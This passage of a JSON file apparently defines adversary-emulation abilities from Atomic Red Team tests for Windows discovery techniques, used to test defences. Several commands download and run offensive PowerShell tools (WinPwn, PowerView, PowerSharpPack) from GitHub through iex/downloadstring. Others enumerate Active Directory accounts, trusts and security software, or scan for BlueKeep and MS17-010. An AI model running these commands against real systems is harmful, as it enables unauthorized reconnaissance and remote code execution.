                    "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "42102f01777d40a7db982282c4c791e9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "42102f01777d40a7db982282c4c791e9"
    },
    "T1201__discovery__Password Policy Discovery__8c4228fa7e1c015590d1f13d935e5bb8": {
        "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1201",
            "name": "Password Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-addefaultdomainpasswordpolicy",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8c4228fa7e1c015590d1f13d935e5bb8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8c4228fa7e1c015590d1f13d935e5bb8"
    },
    "T1046__discovery__Network Service Discovery__bc34d6834bdf568e206627f7809a556f": {
        "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bc34d6834bdf568e206627f7809a556f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bc34d6834bdf568e206627f7809a556f"
    },
    "T1082__discovery__System Information Discovery__413fc5fa7ac34f8a42183217d7f3ec90": {
        "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "413fc5fa7ac34f8a42183217d7f3ec90",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "413fc5fa7ac34f8a42183217d7f3ec90"
    },
    "T1082__discovery__System Information Discovery__c58ba91431b9d73d726ccdd7d030a694": {
        "description": "General privesc checks using the otherchecks function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c58ba91431b9d73d726ccdd7d030a694",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c58ba91431b9d73d726ccdd7d030a694"
    },
    "T1518.001__discovery__Software Discovery: Security Software Discovery__e922717a38fc8806bc9b56b111b999ff": {
        "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}; get-process | ?{$_.Description -like \"*mc*\"}; get-process | ?{$_.ProcessName -like \"*mc*\"}; get-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e922717a38fc8806bc9b56b111b999ff",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e922717a38fc8806bc9b56b111b999ff"
    },
    "T1046__discovery__Network Service Discovery__9381d0e0efbf5bf89a9e512f8b3745f4": {
        "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9381d0e0efbf5bf89a9e512f8b3745f4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9381d0e0efbf5bf89a9e512f8b3745f4"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__f071213a29669283eeb8ab07ddffdbfb": {
        "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-AdGroup -Filter *",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f071213a29669283eeb8ab07ddffdbfb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f071213a29669283eeb8ab07ddffdbfb"
    },
    "T1120__discovery__Peripheral Device Discovery__941eb886a05444e588fd6c17d992df98": {
        "description": "Search for printers / potential vulns using printercheck function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1120",
            "name": "Peripheral Device Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "941eb886a05444e588fd6c17d992df98",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "941eb886a05444e588fd6c17d992df98"
    },
    "T1615__discovery__Group Policy Discovery__834e861bba95b87d066e84c5c6b056a0": {
        "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPORemoteAccessPolicy -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "834e861bba95b87d066e84c5c6b056a0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "834e861bba95b87d066e84c5c6b056a0"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__84a93e5157b690ee0f585cd55c15b0cb": {
        "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "84a93e5157b690ee0f585cd55c15b0cb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "84a93e5157b690ee0f585cd55c15b0cb"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__3d628a543cd195d2a19b89b76a8e5d74": {
        "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3d628a543cd195d2a19b89b76a8e5d74",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3d628a543cd195d2a19b89b76a8e5d74"
    },
    "T1082__discovery__System Information Discovery__286916316d725933021d57fb5620d644": {
        "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "286916316d725933021d57fb5620d644",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "286916316d725933021d57fb5620d644"
    },
    "T1018__discovery__Remote System Discovery__587a8743222626915bb08b3e9e132b19": {
        "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }; catch { $_; exit $_.Exception.HResult }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "587a8743222626915bb08b3e9e132b19",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "587a8743222626915bb08b3e9e132b19"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__ffe23675b3b68eb6d2b6e771451de3af": {
        "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx",
                    "command": "$target = $env:LOGONSERVER; $target = $target.Trim(\"\\\\\"); $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString; wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ffe23675b3b68eb6d2b6e771451de3af",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ffe23675b3b68eb6d2b6e771451de3af"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__4712f45e41760276d20885bbc885a2ef": {
        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4712f45e41760276d20885bbc885a2ef",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4712f45e41760276d20885bbc885a2ef"
    },
    "T1518.001__discovery__Software Discovery: Security Software Discovery__d8dbc446fea6514a712803194b10cb75": {
        "description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-Service WinDefend; Get-MpComputerStatus; Get-MpThreat",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d8dbc446fea6514a712803194b10cb75",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d8dbc446fea6514a712803194b10cb75"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__4bf4facd1dad540d4b17ebe0db235707": {
        "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4bf4facd1dad540d4b17ebe0db235707",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4bf4facd1dad540d4b17ebe0db235707"
    },
    "T1069.001__discovery__Permission Groups Discovery: Local Groups__e541c2b62c3259680863a6f3b410e59a": {
        "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-WMIObject Win32_Group",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e541c2b62c3259680863a6f3b410e59a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e541c2b62c3259680863a6f3b410e59a"
    },
    "T1046__discovery__Network Service Discovery__e958169f1efe85a5a5ea7a77eba8c29e": {
        "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e958169f1efe85a5a5ea7a77eba8c29e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e958169f1efe85a5a5ea7a77eba8c29e"
    },
    "T1033__discovery__System Owner/User Discovery__2bf75f949823305d3ea815c8e94e9ee3": {
        "description": "Use the PowerShell environment variables to identify the current logged user.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path .\\CurrentactiveUser.txt -Force",
                    "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2bf75f949823305d3ea815c8e94e9ee3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2bf75f949823305d3ea815c8e94e9ee3"
    },
    "T1482__discovery__Domain Trust Discovery__feb9647c55185e3b6045293fd26f6a5b": {
        "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "feb9647c55185e3b6045293fd26f6a5b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "feb9647c55185e3b6045293fd26f6a5b"
    },
    "T1135__discovery__Network Share Discovery__d7f1270ba66d5947a1422f7d5b1a36ef": {
        "description": "Network share enumeration using the shareenumeration function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d7f1270ba66d5947a1422f7d5b1a36ef",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d7f1270ba66d5947a1422f7d5b1a36ef"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__03c8721619373b6c18a55721a33cad2c": {
        "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "03c8721619373b6c18a55721a33cad2c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "03c8721619373b6c18a55721a33cad2c"
    },
    "T1082__discovery__System Information Discovery__628181210e822588b5d90e1e256d775a": {
        "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "628181210e822588b5d90e1e256d775a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "628181210e822588b5d90e1e256d775a"
    },
    "T1518__discovery__Software Discovery__0954576f69ca8e140f2cdc9e58b36ff9": {
        "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0954576f69ca8e140f2cdc9e58b36ff9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0954576f69ca8e140f2cdc9e58b36ff9"
    },
    "T1482__discovery__Domain Trust Discovery__ff659febed01ef020792aa5f83d08d6d": {
        "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ff659febed01ef020792aa5f83d08d6d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ff659febed01ef020792aa5f83d08d6d"
    },
    "T1082__discovery__System Information Discovery__e6a9fe7e91030f05ad87b75ad4fd4a3a": {
        "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e6a9fe7e91030f05ad87b75ad4fd4a3a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e6a9fe7e91030f05ad87b75ad4fd4a3a"
    },
    "T1615__discovery__Group Policy Discovery__a3c8fba61f02a7b96306b87121b2ac4b": {
        "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPOAudit -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a3c8fba61f02a7b96306b87121b2ac4b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a3c8fba61f02a7b96306b87121b2ac4b"
    },
    "T1518__discovery__Software Discovery__57548b3eefc3c3d3eaf8c3b51380921a": {
        "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
